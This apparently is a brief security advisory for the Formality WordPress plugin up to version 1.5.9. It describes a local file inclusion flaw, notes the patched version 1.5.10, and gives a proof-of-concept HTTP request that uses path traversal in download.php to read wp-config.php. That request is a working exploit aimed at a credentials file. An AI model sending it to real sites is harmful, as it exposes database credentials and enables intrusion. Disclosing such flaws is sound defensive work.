# Security Policy

Formality <= 1.5.9  Local File Inclusion

poc:
GET //wp-content/plugins/formality/includes/tools/download.php?wproot=C:/xampp1/htdocs&file=../../../../../wp-config.php HTTP/1.1
Host: localhost
Cookie:your Cookie

The Formality plugin for WordPress is vulnerable to Local File Inclusion in versions up to, and including, 1.5.9. This makes it possible for unauthenticated attackers to include and execute arbitrary files on the server, allowing the execution of any PHP code in those files. This can be used to bypass access controls, obtain sensitive data, or achieve code execution in cases where images and other “safe” file types can be uploaded and included.


Patched Version:1.5.10 
